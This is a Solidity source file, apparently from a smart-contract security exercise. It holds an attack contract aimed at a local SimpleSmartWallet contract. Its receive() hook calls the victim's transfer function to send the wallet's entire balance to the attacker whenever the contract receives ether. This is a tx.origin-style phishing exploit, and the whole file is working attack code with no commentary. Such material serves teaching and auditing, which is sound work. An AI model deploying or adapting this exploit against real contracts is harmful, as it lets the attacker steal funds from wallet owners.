// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../SimpleSmartWallet.sol";

contract AttackSimpleSmartWallet {
    SimpleSmartWallet victim;
    address payable owner;

    constructor(address _victim) {
        owner = payable(msg.sender);
        victim = SimpleSmartWallet(_victim);
    }

    receive() external payable {
        victim.transfer(owner, address(victim).balance);
    }
}
